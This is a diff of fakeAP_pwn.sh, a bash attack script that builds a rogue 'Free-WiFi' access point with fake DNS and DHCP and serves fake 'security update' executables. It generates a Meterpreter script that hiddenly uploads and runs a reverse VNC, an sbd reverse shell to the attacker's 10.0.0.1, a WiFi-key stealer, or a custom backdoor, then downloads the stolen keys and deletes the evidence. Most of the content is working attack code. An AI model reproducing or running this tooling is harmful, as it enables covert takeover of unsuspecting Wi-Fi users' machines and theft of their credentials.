@@ -1,12 +1,11 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh (v0.3-RC13 2010-07-07)                                                         #
+# fakeAP_pwn.sh (v0.3-RC16 2010-07-11)                                                         #
 #----------------------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* $htdocs_folder/                                        #
 # The VNC password is "g0tmi1k" (without "")                                                   #
 #----------------------------------------------------------------------------------------------#
 #ToDo List:                                                                                    #
-# v0.3 - Bug fixes                                                                             #
 # v0.3 - Give "index.php" a makeover                                                           #
 # v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
 #                            crafted page without affecting any other clients who are browsing #
@@ -14,7 +13,8 @@
 # v0.5 - Java exploit     - Different "delivery system" ;)                                     #
 # v0.6 - Linux/OSX/x64    - Make compatible                                                    #
 # Monitor traffic         - That isn't on port 80 before they download the payload             #
-# Metasploit "fun"        - Automate a few "things"                                            #
+# Metasploit "fun"        - Automate a few more "things"                                       #
+# apt-get install hostapd freeradius                                                           #
 #----------------------------------------------------------------------------------------------#
 # Defaults *****~~~Change theses~~~*****
 export            ESSID="Free-WiFi"                  # WiFi Name of the fake network.
@@ -22,7 +22,7 @@ export    fakeAPchannel=6                            # Channel for the FakeAP
 export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
 export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use iwconfig!)
 export monitorInterface=mon0                         # The interface airmon-ng creates (Use ifconfig!)
-export          payload=vnc                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
+export          payload=wkv                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
 export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
 export   metasploitPath=/pentest/exploits/framework3 # Metasploit directory. No trailing slash.
 export    htdocs_folder=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
@@ -38,7 +38,7 @@ export          verbose=0                            # 0/1/2      - Verbose mode
 export gatewayIP=`route -n | awk '/^0.0.0.0/ {getline; print $2}'`
 export     ourIP=`ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'`
 export      port=`shuf -i 2000-65000 -n 1`
-export   version="0.3-RC13"
+export   version="0.3-RC16"
 trap 'cleanup' 2 # Interrupt - "Ctrl + C"
 #-----------------------------------------------------------------------------------------------
 function cleanup() {
@@ -46,15 +46,18 @@ function cleanup() {
    echo -e "\e[01;32m[>]\e[00m Cleaning up..."
    if [ "$debug" != "true" ]; then
       if test -e /tmp/fakeAP_pwn.rb;    then rm /tmp/fakeAP_pwn.rb; fi
-      #if test -e /tmp/fakeAP_pwn.rc;    then rm /tmp/fakeAP_pwn.rc; fi
       if test -e /tmp/fakeAP_pwn.dns;   then rm /tmp/fakeAP_pwn.dns; fi
       if test -e /tmp/fakeAP_pwn.dhcp;  then rm /tmp/fakeAP_pwn.dhcp; fi
+      if test -e /tmp/fakeAP_pwn.wkv;   then rm /tmp/fakeAP_pwn.wkv; fi
+
       if test -e /tmp/fakeAP_pwn.lock;  then rm /tmp/fakeAP_pwn.lock; fi
       if test -e dsniff.services;       then rm dsniff.services; fi
       if test -e sslstrip.log;          then rm sslstrip.log; fi
-      if [ "$verbose" == "2" ] ; then echo "[i] Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"; fi
-      $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"
-      if test -e /etc/apache2/sites-available/fakeAP_pwn;         then rm /etc/apache2/sites-available/fakeAP_pwn; fi
+      if test -e /etc/apache2/sites-available/fakeAP_pwn; then
+         if [ "$verbose" == "2" ] ; then echo "[i] Command: ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"; fi
+         $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Restoring apache" -e "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && /etc/init.d/apache2 reload"
+         rm /etc/apache2/sites-available/fakeAP_pwn
+      fi
       if test -e $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; then rm $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb; fi
       if test -e $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin;  then rm $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin; fi
       if test -e $htdocs_folder/Windows-KB183905-x86-ENU.exe;     then rm $htdocs_folder/Windows-KB183905-x86-ENU.exe; fi
@@ -92,7 +95,7 @@ function help() {
    -v  ---  Verbose mode (Displays exactly whats going on.)
    -V  ---  Higher level of Verbose
    -u  ---  Update FakeAP_pwn [*]
-   -?  ---  This help screen
+   -?  ---  This screen
 "
    exit 1
 }
@@ -169,14 +172,14 @@ if [ "$(id -u)" != "0" ]; then echo -e "\e[00;31m[-]\e[00m Not a superuser." 1>&
 if [ "$transparent" == "true" ]; then
     int=$(ifconfig | grep $interface | awk '{print $1}')
     if [ "$int" != "$interface" ]; then
-    echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isnt correct." 1>&2
+    echo -e "\e[00;31m[-]\e[00m The gateway interface $interface, isn't correct." 1>&2
     if [ "$debug" == "true" ]; then ifconfig; fi
     cleanup
   fi
 fi
 int=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
 if [ "$int" != "$wifiInterface" ]; then
-   echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isnt correct." 1>&2
+   echo -e "\e[00;31m[-]\e[00m The wireless interface $wifiInterface, isn't correct." 1>&2
    if [ "$debug" == "true" ]; then iwconfig; fi
    cleanup
 fi
@@ -228,9 +231,9 @@ echo -e "\e[01;32m[>]\e[00m Stopping services and programs..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: killall dhcpd3 apache2 airbase-ng wicd-client"; fi
 $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Programs'" -e "killall dhcpd3 apache2 airbase-ng wicd-client"   # Killing "wicd-client" to prevent channel hopping
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/dhcp3-server stop"; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "/etc/init.d/dhcp3-server stop"               # Stopping DHCP Server
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'DHCP3 Service'"   -e "/etc/init.d/dhcp3-server stop"            # Stopping DHCP Server
 if [ "$verbose" == "2" ] ; then echo "[i] Command: /etc/init.d/apache2 stop"; fi
-$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                    # Stopping apache Web Server
+$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Killing 'Apache2 Service'" -e "/etc/init.d/apache2 stop"                 # Stopping apache Web Server
 
 echo -e "\e[01;32m[>]\e[00m Setting up wireless card..."
 if [ "$verbose" == "2" ] ; then echo "[i] Command: airmon-ng stop $monitorInterface"; fi
@@ -251,15 +254,19 @@ $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Monitor Mode (Starting)" 
 sleep 5
 int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
 if [ "$int" != "$monitorInterface" ]; then
-   echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isnt correct." 1>&2
-   if [ "$debug" == "true" ]; then iwconfig; fi
-   cleanup
+   sleep 5 # Some people need to wait a little bit longer, some don't. Don't force the ones that don't need it!
+   int=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
+   if [ "$int" != "$monitorInterface" ]; then
+      echo -e "\e[00;31m[-]\e[00m The monitor interface $monitorInterface, isn't correct." 1>&2
+      if [ "$debug" == "true" ]; then iwconfig; fi
+      cleanup
+   fi
 fi
 
 if [ "$fakeAPmac" == "true" ]; then
    echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
-   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -r $monitorInterface && ifconfig $monitorInterface up"; fi
-   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -r $monitorInterface && ifconfig $monitorInterface up" &
+   if [ "$verbose" == "2" ] ; then echo "[i] Command: ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up"; fi
+   $xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Changing MAC Address of FakeAP" -e "ifconfig $monitorInterface down && macchanger -A $monitorInterface && ifconfig $monitorInterface up" &
    sleep 2
 fi
 
@@ -279,100 +286,115 @@ session = client
 host,port = session.tunnel_peer.split(':')
 info = @client.sys.config.sysinfo
 os = info['OS']
+print_status(\"New session (#{os}) on #{host}:#{port}...\")
 
-print_status(\"New session found on #{host}:#{port} using #{os}...\")" > /tmp/fakeAP_pwn.rb
-
+if (os =~ /(Linux)/)
+	print_status(\"Coming soon...\")
+end
+if (os =~ /(OSX)/)
+	print_status(\"Coming soon...\")
+end
+if (os =~ /(Windows)/)" > /tmp/fakeAP_pwn.rb
 if [ "$payload" == "vnc" ]; then
-   echo "print_status(\"Killing old VNC (Remote Desktop)...\")
-session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
-sleep(1)
+   echo "	print_status(\"Killing old VNC (Remote Desktop)...\")
+	session.sys.process.execute(\"cmd.exe /C taskkill /IM winvnc.exe /F\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Removing old VNC...\")
-session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\winvnc.exe DEL /f IF EXIST %SystemDrive%\\\winvnc.exe\", nil, {'Hidden' => true})
-session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnchooks.dll DEL /f IF EXIST %SystemDrive%\\\vnchooks.dll\", nil, {'Hidden' => true})
-sleep(1)
+	print_status(\"Removing old VNC...\")
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\winvnc.exe DEL /f IF EXIST %SystemDrive%\\\winvnc.exe\", nil, {'Hidden' => true})
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnchooks.dll DEL /f IF EXIST %SystemDrive%\\\vnchooks.dll\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Uploading VNC...\")
-session.fs.file.upload_file(\"%SystemDrive%\\\winvnc.exe\", \"$htdocs_folder/winvnc.exe\")
-session.fs.file.upload_file(\"%SystemDrive%\\\vnchooks.dll\", \"$htdocs_folder/vnchooks.dll\")
-session.fs.file.upload_file(\"%SystemDrive%\\\vnc.reg\", \"$htdocs_folder/vnc.reg\")" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Uploading VNC...\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\winvnc.exe\", \"$htdocs_folder/winvnc.exe\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\vnchooks.dll\", \"$htdocs_folder/vnchooks.dll\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\vnc.reg\", \"$htdocs_folder/vnc.reg\")" >> /tmp/fakeAP_pwn.rb
 elif [ "$payload" == "sbd" ]; then
-   echo "print_status(\"Killing old SBD (SecureBackDoor)...\")
-session.sys.process.execute(\"cmd.exe /C taskkill /IM sbd.exe /F\", nil, {'Hidden' => true})
-sleep(1)
+   echo "	print_status(\"Killing old SBD (SecureBackDoor)...\")
+	session.sys.process.execute(\"cmd.exe /C taskkill /IM sbd.exe /F\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Removing old SBD...\")
-session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\sbd.exe DEL /f IF EXIST %SystemDrive%\\\sbd.exe\", nil, {'Hidden' => true})
-sleep(1)
+	print_status(\"Removing old SBD...\")
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\sbd.exe DEL /f IF EXIST %SystemDrive%\\\sbd.exe\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Uploading SBD...\")
-session.fs.file.upload_file(\"%SystemDrive%\\\sbd.exe\", \"$htdocs_folder/sbd.exe\")" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Uploading SBD...\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\sbd.exe\", \"$htdocs_folder/sbd.exe\")" >> /tmp/fakeAP_pwn.rb
 elif [ "$payload" == "wkv" ]; then
-   echo "print_status(\"Uploading WKV...\")
-session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocs_folder/wkv.exe\")" >> /tmp/fakeAP_pwn.rb
+   echo "	print_status(\"Uploading WKV...\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\wkv.exe\", \"$htdocs_folder/wkv.exe\")" >> /tmp/fakeAP_pwn.rb
 else
-   echo "print_status(\"Killing old backdoor ($backdoorPath)...\")
-session.sys.process.execute(\"cmd.exe /C taskkill /IM backdoor.exe /F\", nil, {'Hidden' => true})
-sleep(1)
+   echo "	print_status(\"Killing old backdoor ($backdoorPath)...\")
+	session.sys.process.execute(\"cmd.exe /C taskkill /IM backdoor.exe /F\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Removing old backdoor...\")
-session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\backdoor.exe DEL /f IF EXIST %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})
-sleep(1)
+	print_status(\"Removing old backdoor...\")
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\backdoor.exe DEL /f IF EXIST %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Uploading backdoor.exe...\")
-session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Uploading backdoor.exe...\")
+	session.fs.file.upload_file(\"%SystemDrive%\\\backdoor.exe\", \"$backdoorPath\")" >> /tmp/fakeAP_pwn.rb
 fi
-echo "sleep(1)
+echo "	sleep(1)
 " >> /tmp/fakeAP_pwn.rb
 if [ "$payload" == "vnc" ]; then
-   echo "print_status(\"Configuring VNC...\")
-session.sys.process.execute(\"regedit.exe /S C:\\\vnc.reg\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%
-sleep(1)
+   echo "	print_status(\"Configuring VNC...\")
+	session.sys.process.execute(\"regedit.exe /S %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Executing VNC...\")
-session.sys.process.execute(\"C:\\\winvnc.exe -kill -run\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%
-sleep(1)
+	print_status(\"Executing VNC...\")
+	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\winvnc.exe -kill -run\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Reversing VNC...\")
-session.sys.process.execute(\"C:\\\winvnc.exe -connect 10.0.0.1\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Reversing VNC...\")
+	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\winvnc.exe -connect 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
 elif [ "$payload" == "sbd" ]; then
-   echo "print_status(\"Executing SBD...\")
-session.sys.process.execute(\"C:\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
+   echo "	print_status(\"Executing SBD...\")
+	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\sbd.exe -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
 elif [ "$payload" == "wkv" ]; then
-   echo "print_status(\"Executing WKV...\")
-session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\wkv.exe /stabular /\\\"%SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%
-sleep(1)
+   echo "	print_status(\"Executing WKV...\")
+	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\wkv.exe /stabular \\\"%SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Downloading keys...\")
-session.fs.file.download_file(\"/root/wkv.log\", \\\"%SystemDrive%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Downloading keys...\")
+	session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%SystemDrive%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
 else
-   echo "print_status(\"Executing backdoor.exe...\")
-session.sys.process.execute(\"C:\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
+   echo "	print_status(\"Executing backdoor.exe...\")
+	session.sys.process.execute(\"cmd.exe /c %SystemDrive%\\\backdoor.exe\", nil, {'Hidden' => true})   #Had a problem with %SystemDrive%" >> /tmp/fakeAP_pwn.rb
 fi
-echo "sleep(1)
+echo "	sleep(1)
 
-print_status(\"Creating proof...\")
-session.sys.process.execute(\"cmd.exe /C ipconfig | find \\\"IP\\\" > \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
-sleep(1)
+	print_status(\"Creating proof...\")
+	session.sys.process.execute(\"cmd.exe /C ipconfig | find \\\"IP\\\" > \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
+	sleep(1)
 
-print_status(\"Downloading proof...\")
-session.fs.file.download_file(\"/tmp/fakeAP_pwn.lock\", \"%SystemDrive%\\\ip.log\")
-sleep(1)
+	print_status(\"Downloading proof...\")
+	session.fs.file.download_file(\"/tmp/fakeAP_pwn.lock\", \"%SystemDrive%\\\ip.log\")
+	sleep(1)
 
-print_status(\"Removing proof...\")
-session.sys.process.execute(\"cmd.exe /C del /f \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})" >> /tmp/fakeAP_pwn.rb
+	print_status(\"Removing proof...\")
+	session.sys.process.execute(\"cmd.exe /C del /f \\\"%SystemDrive%\\\ip.log\", nil, {'Hidden' => true})
+	sleep(1)
+" >> /tmp/fakeAP_pwn.rb
 if [ "$payload" == "vnc" ]; then
-   echo "print_status(\"Removing temp VNC files...\")
-session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnc.reg DEL /f IF EXIST %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
-sleep(1)" >> /tmp/fakeAP_pwn.rb
+   echo "	print_status(\"Removing temp VNC files...\")
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\vnc.reg DEL /f IF EXIST %SystemDrive%\\\vnc.reg\", nil, {'Hidden' => true})
+	sleep(1)" >> /tmp/fakeAP_pwn.rb
+elif [ "$payload" == "wkv" ]; then
+   echo "	print_status(\"Removing temp WKV files...\")
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.exe DEL /f IF EXIST %SystemDrive%\\\wkv.exe\", nil, {'Hidden' => true})
+	session.sys.process.execute(\"cmd.exe /C IF EXIST %SystemDrive%\\\wkv.txt DEL /f IF EXIST %SystemDrive%\\\wkv.txt\", nil, {'Hidden' => true})
+	sleep(1)" >> /tmp/fakeAP_pwn.rb
 fi
-echo "print_status(\"Done! (= Have you... g0tmi1k?\")
+echo "end
+
+print_status(\"Done! (= Have you... g0tmi1k?\")
 sleep(1)" >> /tmp/fakeAP_pwn.rb
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi
 
 # dhcpd script
 if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
-echo "# g0tmi1k - dhcpd.con v$version
+echo "# g0tmi1k - fakeAP_pwn.dhcp v$version
 ddns-update-style interim;
 ignore client-updates; # Ignore all client requests for DDNS update
 authoritative;
@@ -390,20 +412,13 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option netbios-name-servers 10.0.0.99; # The NetBIOS name server (WINS)
 }" > /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
-if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
+if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dhcp; fi
 
 if [ "$transparent" != "true" ]; then
    # dns script
-   #echo "use auxiliary/server/fakedns
-#set INTERFACE at0
-#set DOMAINBYPASS *
-#set SRVHOST 0.0.0.0
-#set SRVPORT 53
-#set TARGETHOST 10.0.0.1
-#run" > /tmp/fakeAP_pwn.rc
    echo "10.0.0.1 *" > /tmp/fakeAP_pwn.dns
    if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.dns"; fi
-   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
+   if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.dns; fi
 fi
 
 
@@ -481,8 +496,8 @@ $xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e 
 
 echo -e "\e[01;32m[>]\e[00m Creating our fake access point..."
 if [ "$respond2All" == "true" ]; then
-   if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -P -C 0 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
-   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -P -C 30 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
+   if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
+   $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
 else
    if [ "$verbose" == "2" ] ; then echo "[i] Command: airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"; fi
    $xterm -geometry 75x4+10+0 -T "fakeAP_pwn v$version - Fake Access Point" -e "airbase-ng -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v" &
@@ -543,7 +558,7 @@ if [ "$transparent" != "true" ]; then
 fi
 
 #echo -e "\e[01;32m[>]\e[00m Starting SSLStrip..."
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; #fi
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"; fi
 #iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 #if [ "$verbose" == "2" ] ; then echo "[i] Command: sslstrip -k -f -l 10000"; fi
 #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "sslstrip -k -f -l 10000" &
@@ -610,6 +625,12 @@ if [ "$transparent" == "true" ]; then
    iptables --table nat -A POSTROUTING -o $interface -j MASQUERADE
 fi
 
+if [ "$payload" == "wkv" ]; then
+   echo -e "\e[00;31m[i] Opening WiFi Key file...."
+   cat /tmp/fakeAP_pwn.wkv
+   sleep 1
+fi
+
 if [ "$extras" == "true" ]; then
    echo -e "\e[01;32m[>]\e[00m Caputuring infomation about the target..."
    if [ "$verbose" == "2" ] ; then echo "[i] Command: urlsnarf -i at0"; fi
@@ -627,21 +648,3 @@ if [ "$extras" == "true" ]; then
 fi
 
 cleanup
-
-
-
-# Metasploit stuff...maybe?
-# sysinfo
-# getuid
-# shell
-# use priv
-# ps
-# migrate 2040 (something like svchost.exe with NT AUTHORITY\SYSTEM)
-# run hashdump
-# ./john /tmp/hash.dump
-
-#DHCP stuff...
-# cat /dev/null > /var/run/dhcpd.pid
-# chgrp dhcpd /var/run/dhcpd.pid
-# chown dhcpd /var/run/dhcpd.pid
-# echo > '/var/lib/dhcp3/dhcpd.leases'
